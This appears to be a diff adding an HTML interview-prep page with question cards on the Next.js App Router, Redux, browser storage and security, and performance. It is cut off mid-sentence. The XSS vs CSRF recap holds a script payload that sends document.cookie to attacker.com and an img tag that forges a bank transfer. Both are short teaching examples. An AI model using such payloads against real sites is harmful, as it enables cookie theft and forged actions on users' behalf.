+            <!-- 1. App Router vs Pages Router -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">1. App Router vs Pages Router?</h3>
+                    <span class="badge intermediate">Intermediate</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    <strong>Pages Router:</strong> File-system based routing in `pages/`. <strong>App Router:</strong>
+                    New paradigm in `app/` using Server Components by default.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>App Router supports Layouts, Server Components, Streaming, and better data fetching patterns. It
+                        is the future of Next.js.</p>
+                </div>
+                <div class="code-example">
+                    <pre><code>// Pages Router Structure
+pages/
+  index.tsx
+  about.tsx
+
+// App Router Structure
+app/
+  page.tsx
+  about/
+    page.tsx
+  layout.tsx // Shared UI</code></pre>
+                </div>
+            </div>
+
+            <!-- 2. Server vs Client Components -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">2. When to use Client Components?</h3>
+                    <span class="badge intermediate">Intermediate</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    Use them when you need interactivity (onClick, onChange), hooks (useState, useEffect), or browser
+                    APIs.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>By default, everything in App Router is a Server Component. Add <code>'use client'</code> at the
+                        top of the file to make it a Client Component. Server Components cannot use hooks or event
+                        listeners.</p>
+                </div>
+                <div class="code-example">
+                    <pre><code>'use client'; // Marks this as a Client Component
+
+import { useState } from 'react';
+
+export default function Counter() {
+  const [count, setCount] = useState(0);
+  return &lt;button onClick={() => setCount(count + 1)}&gt;{count}&lt;/button&gt;;
+}</code></pre>
+                </div>
+            </div>
+
+            <!-- 3. Data Fetching in App Router -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">3. How do you fetch data in App Router?</h3>
+                    <span class="badge advanced">Advanced</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    Using standard <code>async/await</code> in Server Components.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>You can fetch data directly in the component body. Next.js extends the native <code>fetch</code>
+                        API to allow caching and revalidation configuration (e.g.,
+                        <code>next: { revalidate: 3600 }</code>).</p>
+                </div>
+                <div class="code-example">
+                    <pre><code>async function getData() {
+  const res = await fetch('https://api.example.com/data');
+  if (!res.ok) throw new Error('Failed to fetch data');
+  return res.json();
+}
+
+export default async function Page() {
+  const data = await getData();
+  return &lt;main&gt;{/* ... */}&lt;/main&gt;;
+}</code></pre>
+                </div>
+            </div>
+
+            <!-- 4. Static vs Dynamic Rendering -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">4. Static vs Dynamic Rendering in Next.js?</h3>
+                    <span class="badge advanced">Advanced</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    <strong>Static:</strong> Prerendered at build time (default). <strong>Dynamic:</strong> Rendered at
+                    request time.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>Next.js automatically switches to dynamic rendering if you use dynamic functions (cookies,
+                        headers) or uncached data fetches.</p>
+                </div>
+                <div class="code-example">
+                    <pre><code>// Force Dynamic Rendering
+export const dynamic = 'force-dynamic';
+
+// Or use dynamic functions
+import { cookies } from 'next/headers';
+const cookieStore = cookies();</code></pre>
+                </div>
+            </div>
+
+            <!-- 5. Image Optimization -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">5. How does the Next.js Image component optimize images?</h3>
+                    <span class="badge intermediate">Intermediate</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    It automatically resizes, compresses, and serves images in modern formats (WebP/AVIF) based on the
+                    user's device.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>It also prevents Layout Shift (CLS) by requiring width/height or fill mode, and lazy loads images
+                        by default.</p>
+                </div>
+                <div class="code-example">
+                    <pre><code>import Image from 'next/image';
+
+&lt;Image
+  src="/profile.png"
+  width={500}
+  height={500}
+  alt="Profile Picture"
+/&gt;</code></pre>
+                </div>
+            </div>
+
+            <!-- 6. Middleware -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">6. What is Middleware in Next.js?</h3>
+                    <span class="badge advanced">Advanced</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    Code that runs before a request is completed. Useful for authentication, redirects, and rewriting
+                    paths.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>It runs on the Edge runtime (limited Node.js APIs). You can modify the request or response
+                        headers and redirect users based on conditions (e.g., checking a cookie).</p>
+                </div>
+                <div class="code-example">
+                    <pre><code>// middleware.ts
+import { NextResponse } from 'next/server';
+import type { NextRequest } from 'next/server';
+
+export function middleware(request: NextRequest) {
+  if (request.nextUrl.pathname.startsWith('/dashboard')) {
+    return NextResponse.rewrite(new URL('/auth/login', request.url));
+  }
+}</code></pre>
+                </div>
+            </div>
+
+            <!-- 7. ISR (Incremental Static Regeneration) -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">7. What is ISR?</h3>
+                    <span class="badge advanced">Advanced</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    Allows you to update static pages after you've built your site.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>You can retain the benefits of static generation while scaling to millions of pages. Pages are
+                        regenerated in the background as traffic comes in, based on a revalidation interval.</p>
+                </div>
+                <div class="code-example">
+                    <pre><code>// Revalidate every hour
+export const revalidate = 3600;
+
+export default async function Page() {
+  const data = await fetch('...', { next: { revalidate: 3600 } });
+  return ...
+}</code></pre>
+                </div>
+            </div>
+
+            <!-- 8. Route Handlers -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">8. What are Route Handlers?</h3>
+                    <span class="badge intermediate">Intermediate</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    The equivalent of API routes in the App Router (<code>route.ts</code> files).
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>They allow you to create custom request handlers for a given route using the Web Request and
+                        Response APIs. Support GET, POST, PUT, PATCH, DELETE, HEAD, and OPTIONS.</p>
+                </div>
+                <div class="code-example">
+                    <pre><code>// app/api/hello/route.ts
+export async function GET(request: Request) {
+  return Response.json({ message: 'Hello World' });
+}</code></pre>
+                </div>
+            </div>
+
+            <!-- 9. Metadata API -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">9. How do you handle SEO in App Router?</h3>
+                    <span class="badge intermediate">Intermediate</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    Using the Metadata API (exporting a <code>metadata</code> object or <code>generateMetadata</code>
+                    function).
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>It replaces the old <code>Head</code> component. You can define title, description, open graph
+                        tags, etc., either statically or dynamically based on route params.</p>
+                </div>
+                <div class="code-example">
+                    <pre><code>// Static Metadata
+export const metadata = {
+  title: 'My Page',
+  description: 'This is my page',
+};
+
+// Dynamic Metadata
+export async function generateMetadata({ params }) {
+  return {
+    title: `Product ${params.id}`,
+  };
+}</code></pre>
+                </div>
+            </div>
+
+            <!-- 10. Server Actions (Next.js context) -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">10. How do Server Actions work in Next.js?</h3>
+                    <span class="badge advanced">Advanced</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    They allow you to call server-side functions directly from client components (e.g., form actions).
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>Next.js handles the API endpoint creation automatically. It's great for mutations. You can use
+                        <code>revalidatePath</code> to update the UI after the action completes.</p>
+                </div>
+                <div class="code-example">
+                    <pre><code>// app/actions.ts
+'use server';
+
+export async function createTodo(formData: FormData) {
+  await db.todo.create({ title: formData.get('title') });
+  revalidatePath('/todos');
+}</code></pre>
+                </div>
+            </div>
+        </section>
+
+        <!-- Redux Section -->
+        <section id="redux" class="chapter">
+            <h2 class="chapter-title">Redux & State Management</h2>
+            <!-- 1. Flux Architecture -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">1. What is Flux Architecture?</h3>
+                    <span class="badge basic">Basic</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    An application architecture for building client-side web apps. It enforces a <strong>unidirectional
+                        data flow</strong>.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>Action -> Dispatcher -> Store -> View. Redux is a library inspired by Flux but simplifies it
+                        (single store, no dispatcher).</p>
+                </div>
+                <div class="code-example">
+                    <pre><code>// Flux Flow
+Action -> Dispatcher -> Store -> View -> Action
+
+// Redux Flow
+Action -> Reducer -> Store -> View -> Action</code></pre>
+                </div>
+            </div>
+
+            <!-- 2. Redux Principles -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">2. What are the Three Principles of Redux?</h3>
+                    <span class="badge basic">Basic</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    Single Source of Truth, State is Read-Only, Changes are made with Pure Functions (Reducers).
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <ol>
+                        <li><strong>Single Source of Truth:</strong> The state of your whole application is stored in an
+                            object tree within a single store.</li>
+                        <li><strong>State is Read-Only:</strong> The only way to change the state is to emit an action.
+                        </li>
+                        <li><strong>Changes are made with Pure Functions:</strong> To specify how the state tree is
+                            transformed by actions, you write pure reducers.</li>
+                    </ol>
+                </div>
+            </div>
+
+            <!-- 3. Actions & Reducers -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">3. Explain Actions and Reducers.</h3>
+                    <span class="badge basic">Basic</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    <strong>Action:</strong> A plain object describing <em>what happened</em>. <strong>Reducer:</strong>
+                    A pure function describing <em>how the state changes</em> in response to an action.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>Reducer signature: <code>(previousState, action) => newState</code>. It must never mutate the
+                        state directly.</p>
+                </div>
+                <div class="code-example">
+                    <pre><code>// Action
+const increment = { type: 'INCREMENT' };
+
+// Reducer
+function counter(state = 0, action) {
+  switch (action.type) {
+    case 'INCREMENT':
+      return state + 1;
+    default:
+      return state;
+  }
+}</code></pre>
+                </div>
+            </div>
+
+            <!-- 4. Store -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">4. What is the Store?</h3>
+                    <span class="badge basic">Basic</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    The object that holds the application state.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>It provides methods to access state (<code>getState()</code>), update state
+                        (<code>dispatch(action)</code>), and register listeners (<code>subscribe(listener)</code>).</p>
+                </div>
+                <div class="code-example">
+                    <pre><code>import { createStore } from 'redux';
+const store = createStore(counter);
+
+store.subscribe(() => console.log(store.getState()));
+
+store.dispatch({ type: 'INCREMENT' }); // 1</code></pre>
+                </div>
+            </div>
+
+            <!-- 5. Middleware (Thunk vs Saga) -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">5. Redux Thunk vs Redux Saga?</h3>
+                    <span class="badge intermediate">Intermediate</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    Middleware for handling side effects (async logic). <strong>Thunk</strong> allows dispatching
+                    functions. <strong>Saga</strong> uses Generators to handle complex async flows.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <ul>
+                        <li><strong>Thunk:</strong> Simple, easy to learn. Good for simple async calls.</li>
+                        <li><strong>Saga:</strong> More powerful, testable, and better for complex flows (cancellation,
+                            debouncing, race conditions). Uses ES6 Generators.</li>
+                    </ul>
+                </div>
+                <div class="code-example">
+                    <pre><code>// Thunk
+const fetchUser = () => async (dispatch) => {
+  const user = await api.getUser();
+  dispatch({ type: 'USER_LOADED', payload: user });
+};
+
+// Saga
+function* fetchUser() {
+  const user = yield call(api.getUser);
+  yield put({ type: 'USER_LOADED', payload: user });
+}</code></pre>
+                </div>
+            </div>
+
+            <!-- 6. connect vs Hooks -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">6. `connect` HOC vs `useSelector`/`useDispatch` Hooks?</h3>
+                    <span class="badge intermediate">Intermediate</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    <code>connect</code> is the legacy way (HOC) to connect components to Redux. Hooks are the modern,
+                    recommended way.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>Hooks are cleaner and reduce boilerplate. <code>useSelector</code> extracts data from the store
+                        state. <code>useDispatch</code> returns the dispatch function.</p>
+                </div>
+                <div class="code-example">
+                    <pre><code>// Hooks (Modern)
+const count = useSelector(state => state.counter);
+const dispatch = useDispatch();
+
+// connect (Legacy)
+export default connect(mapStateToProps, mapDispatchToProps)(Component);</code></pre>
+                </div>
+            </div>
+
+            <!-- 7. Redux Toolkit (RTK) -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">7. What is Redux Toolkit (RTK)?</h3>
+                    <span class="badge intermediate">Intermediate</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    The official, opinionated toolset for efficient Redux development. It simplifies store setup and
+                    reduces boilerplate.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>It includes <code>configureStore</code>, <code>createSlice</code> (auto-generates
+                        actions/reducers), and uses Immer library internally to allow "mutating" logic in reducers
+                        (which Immer converts to immutable updates).</p>
+                </div>
+                <div class="code-example">
+                    <pre><code>const counterSlice = createSlice({
+  name: 'counter',
+  initialState: 0,
+  reducers: {
+    increment: state => state + 1, // "Mutation" allowed thanks to Immer
+  },
+});
+
+const store = configureStore({ reducer: counterSlice.reducer });</code></pre>
+                </div>
+            </div>
+
+            <!-- 8. Immutability -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">8. Why is Immutability important in Redux?</h3>
+                    <span class="badge intermediate">Intermediate</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    Redux relies on shallow equality checking to determine if the state has changed.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>If you mutate the state directly, Redux won't detect the change, and components won't re-render.
+                        It also enables features like Time Travel Debugging.</p>
+                </div>
+                <div class="code-example">
+                    <pre><code>// Bad (Mutation)
+state.value = 1;
+return state;
+
+// Good (Immutable Update)
+return { ...state, value: 1 };</code></pre>
+                </div>
+            </div>
+
+            <!-- 9. Reselect -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">9. What is Reselect?</h3>
+                    <span class="badge advanced">Advanced</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    A library for creating memoized "selector" functions.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>Selectors compute derived data from the Redux store. Reselect memoizes them so they are only
+                        recomputed when their input arguments change, improving performance.</p>
+                </div>
+                <div class="code-example">
+                    <pre><code>const selectTax = createSelector(
+  state => state.subtotal,
+  state => state.taxPercent,
+  (subtotal, taxPercent) => subtotal * (taxPercent / 100)
+);</code></pre>
+                </div>
+            </div>
+
+            <!-- 10. Redux DevTools -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">10. What are Redux DevTools?</h3>
+                    <span class="badge basic">Basic</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    A browser extension that allows you to inspect every action dispatched, view the state changes, and
+                    "time travel" (undo/redo actions).
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>It is essential for debugging Redux applications.</p>
+                </div>
+            </div>
+
+            <!-- 11. Context vs Redux (Deep Dive) -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">11. Can Context API replace Redux?</h3>
+                    <span class="badge intermediate">Intermediate</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    For simple apps, yes. For complex apps with frequent updates, no.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>Context + useReducer can mimic Redux, but it lacks the performance optimizations (selectors),
+                        middleware ecosystem, and DevTools of Redux. Context triggers a re-render of all consumers on
+                        every update.</p>
+                </div>
+            </div>
+
+            <!-- 12. Normalizing State -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">12. What is State Normalization?</h3>
+                    <span class="badge advanced">Advanced</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    Structuring the state like a database (flat structure) rather than nested objects.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>Instead of an array of objects, use an object keyed by IDs and an array of IDs. This makes
+                        updates and lookups faster (O(1) vs O(n)) and avoids deep nesting issues.</p>
+                </div>
+                <div class="code-example">
+                    <pre><code>// Normalized State
+{
+  users: {
+    byId: {
+      "1": { id: "1", name: "Alice" },
+      "2": { id: "2", name: "Bob" }
+    },
+    allIds: ["1", "2"]
+  }
+}</code></pre>
+                </div>
+            </div>
+
+            <!-- 13. Async Actions -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">13. How do you handle Async Actions in Redux?</h3>
+                    <span class="badge intermediate">Intermediate</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    Redux itself is synchronous. You need middleware like Thunk or Saga.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>Standard pattern: Dispatch <code>FETCH_START</code> -> Make API call -> Dispatch
+                        <code>FETCH_SUCCESS</code> or <code>FETCH_FAILURE</code>.</p>
+                </div>
+            </div>
+
+            <!-- 14. RTK Query -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">14. What is RTK Query?</h3>
+                    <span class="badge advanced">Advanced</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    A powerful data fetching and caching tool built into Redux Toolkit.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>It eliminates the need to write thunks and reducers for data fetching. It handles caching,
+                        polling, invalidation, and optimistic updates automatically.</p>
+                </div>
+                <div class="code-example">
+                    <pre><code>// Define API
+export const pokemonApi = createApi({
+  reducerPath: 'pokemonApi',
+  baseQuery: fetchBaseQuery({ baseUrl: 'https://pokeapi.co/api/v2/' }),
+  endpoints: (builder) => ({
+    getPokemonByName: builder.query({
+      query: (name) => `pokemon/${name}`,
+    }),
+  }),
+});
+
+// Use Hook
+const { data, error, isLoading } = useGetPokemonByNameQuery('bulbasaur');</code></pre>
+                </div>
+            </div>
+
+            <!-- 15. Alternatives -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">15. Mention some Redux alternatives.</h3>
+                    <span class="badge advanced">Advanced</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    Zustand, Recoil, MobX, Jotai.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <ul>
+                        <li><strong>Zustand:</strong> Minimalist, hook-based, no boilerplate.</li>
+                        <li><strong>Recoil/Jotai:</strong> Atomic state management (good for derived state).</li>
+                        <li><strong>MobX:</strong> Observable-based, mutable style.</li>
+                    </ul>
+                </div>
+                <div class="code-example">
+                    <pre><code>// Zustand Example
+import { create } from 'zustand';
+
+const useStore = create((set) => ({
+  bears: 0,
+  increasePopulation: () => set((state) => ({ bears: state.bears + 1 })),
+}));</code></pre>
+                </div>
+            </div>
+        </section>
+
+        <!-- Browser Storage & Security Section -->
+        <section id="browser-storage" class="chapter">
+            <h2 class="chapter-title">Browser Storage & Security</h2>
+
+            <!-- 1. LocalStorage vs SessionStorage vs Cookies -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">1. LocalStorage vs SessionStorage vs Cookies?</h3>
+                    <span class="badge intermediate">Intermediate</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    <strong>LocalStorage:</strong> Persists forever (5-10MB). <strong>SessionStorage:</strong> Persists
+                    for tab session (5MB). <strong>Cookies:</strong> Sent with requests (4KB).
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>Cookies are primarily for server-side reading (auth tokens). Storage APIs are for client-side
+                        data. Cookies have security flags (HttpOnly, Secure) that storage APIs lack.</p>
+                </div>
+                <div class="code-example">
+                    <pre><code>// LocalStorage
+localStorage.setItem('key', 'value');
+localStorage.getItem('key');
+
+// SessionStorage
+sessionStorage.setItem('key', 'value');
+
+// Cookies (Raw JS)
+document.cookie = "username=John Doe; expires=Thu, 18 Dec 2025 12:00:00 UTC; path=/";</code></pre>
+                </div>
+            </div>
+
+            <!-- 2. IndexedDB -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">2. What is IndexedDB?</h3>
+                    <span class="badge advanced">Advanced</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    A low-level API for client-side storage of significant amounts of structured data, including
+                    files/blobs.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>Unlike LocalStorage (synchronous, string-only), IndexedDB is asynchronous, transactional, and can
+                        store objects. It's ideal for offline apps (PWAs) and caching large datasets.</p>
+                </div>
+                <div class="code-example">
+                    <pre><code>const request = indexedDB.open("MyDatabase", 1);
+
+request.onupgradeneeded = (event) => {
+  const db = event.target.result;
+  const objectStore = db.createObjectStore("customers", { keyPath: "ssn" });
+  objectStore.createIndex("name", "name", { unique: false });
+};</code></pre>
+                </div>
+            </div>
+
+            <!-- 3. Session vs Token Auth -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">3. Session-based vs Token-based Authentication?</h3>
+                    <span class="badge intermediate">Intermediate</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    <strong>Session:</strong> Server stores state (ID in cookie). <strong>Token (JWT):</strong>
+                    Stateless (data in token).
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>Sessions are easier to invalidate but require server memory/DB lookups. Tokens scale better (no
+                        server state) but are harder to invalidate (require blocklists or short expiry).</p>
+                </div>
+                <div class="code-example">
+                    <pre><code>// Token (JWT) Header
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
+
+// Session Cookie
+Cookie: session_id=1234567890abcdef;</code></pre>
+                </div>
+            </div>
+
+            <!-- 4. Cookie Security Flags -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">4. Explain HttpOnly, Secure, and SameSite cookies.</h3>
+                    <span class="badge advanced">Advanced</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    Security attributes to protect cookies from theft and misuse.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <ul>
+                        <li><strong>HttpOnly:</strong> Cannot be accessed via JavaScript (prevents XSS theft).</li>
+                        <li><strong>Secure:</strong> Only sent over HTTPS.</li>
+                        <li><strong>SameSite:</strong> Controls when cookies are sent with cross-site requests
+                            (Strict/Lax/None) to prevent CSRF.</li>
+                    </ul>
+                </div>
+                <div class="code-example">
+                    <pre><code>Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2025 07:28:00 GMT; Secure; HttpOnly; SameSite=Strict</code></pre>
+                </div>
+            </div>
+
+            <!-- 5. Content Security Policy (CSP) -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">5. What is Content Security Policy (CSP)?</h3>
+                    <span class="badge advanced">Advanced</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    A security layer that helps detect and mitigate certain types of attacks, including Cross-Site
+                    Scripting (XSS) and data injection attacks.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>It allows you to define which dynamic resources are allowed to load (e.g., "only allow scripts
+                        from my domain and google.com"). Defined via HTTP header or <code>&lt;meta&gt;</code> tag.</p>
+                </div>
+                <div class="code-example">
+                    <pre><code>Content-Security-Policy: default-src 'self'; img-src *; media-src media1.com media2.com; script-src userscripts.example.com</code></pre>
+                </div>
+            </div>
+
+            <!-- 6. Same-Origin Policy (SOP) -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">6. What is the Same-Origin Policy?</h3>
+                    <span class="badge basic">Basic</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    A browser security mechanism that restricts how a document or script loaded from one origin can
+                    interact with a resource from another origin.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>Two URLs have the same origin if the protocol, port (if specified), and host are the same. CORS
+                        is the way to relax this policy safely.</p>
+                </div>
+                <div class="code-example">
+                    <pre><code>// Origin: http://store.company.com
+
+http://store.company.com/dir/page.html // Success
+http://store.company.com/dir/other.html // Success
+https://store.company.com/page.html // Failure (Different Protocol)
+http://store.company.com:81/dir/etc.html // Failure (Different Port)
+http://news.company.com/dir/other.html // Failure (Different Host)</code></pre>
+                </div>
+            </div>
+
+            <!-- 7. Storage Quotas -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">7. How do browser storage quotas work?</h3>
+                    <span class="badge advanced">Advanced</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    Browsers limit how much data a site can store. It varies by device and available disk space.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>If the quota is exceeded, the browser may throw a <code>QuotaExceededError</code>. You can check
+                        available space using <code>navigator.storage.estimate()</code>. Browsers may also evict data
+                        under storage pressure (LRU policy).</p>
+                </div>
+                <div class="code-example">
+                    <pre><code>if (navigator.storage && navigator.storage.estimate) {
+  const quota = await navigator.storage.estimate();
+  // quota.usage -> used bytes
+  // quota.quota -> available bytes
+  console.log(`Using ${quota.usage} out of ${quota.quota} bytes.`);
+}</code></pre>
+                </div>
+            </div>
+
+            <!-- 8. XSS vs CSRF (Refresher) -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">8. Quick recap: XSS vs CSRF?</h3>
+                    <span class="badge intermediate">Intermediate</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    <strong>XSS:</strong> Attacker runs script on your site (steals data). <strong>CSRF:</strong>
+                    Attacker tricks user into doing action on your site (uses user's auth).
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>XSS is prevented by sanitization/CSP. CSRF is prevented by Anti-CSRF tokens and SameSite cookies.
+                    </p>
+                </div>
+                <div class="code-example">
+                    <pre><code>// XSS Attack (Malicious Script)
+&lt;script&gt;window.location='http://attacker.com/?cookie='+document.cookie&lt;/script&gt;
+
+// CSRF Attack (Malicious Request)
+&lt;img src="http://bank.com/transfer?to=attacker&amount=1000"&gt;</code></pre>
+                </div>
+            </div>
+        </section>
+
+        <!-- Performance & Optimization Section -->
+        <section id="performance" class="chapter">
+            <h2 class="chapter-title">Performance & Optimization</h2>
+
+            <!-- 1. API Optimization -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">1. How do you optimize API calls?</h3>
+                    <span class="badge advanced">Advanced</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    Caching, Debouncing/Throttling, and avoiding waterfalls.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <ul>
+                        <li><strong>Caching:</strong> Use React Query or SWR to cache responses.</li>
+                        <li><strong>Debouncing:</strong> Delay API calls until user stops typing (search bars).</li>
+                        <li><strong>Parallelization:</strong> Use <code>Promise.all</code> instead of awaiting
+                            sequentially.</li>
+                        <li><strong>Keep-Alive:</strong> Use HTTP/2 to reuse connections.</li>
+                    </ul>
+                </div>
+                <div class="code-example">
+                    <pre><code>// Parallelization
+const [user, posts] = await Promise.all([
+  fetch('/api/user'),
+  fetch('/api/posts')
+]);
+
+// Caching (React Query)
+const { data } = useQuery('user', fetchUser);</code></pre>
+                </div>
+            </div>
+
+            <!-- 2. Fixing Re-renders -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">2. How do you identify and fix unnecessary re-renders?</h3>
+                    <span class="badge advanced">Advanced</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    Use React DevTools Profiler to find them. Fix with <code>React.memo</code>, <code>useMemo</code>,
+                    and <code>useCallback</code>.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>Check if a parent is passing a new object/function reference on every render. Move state down to
+                        where it's used (State Colocation). Use "Lift Content Up" (passing components as children) to
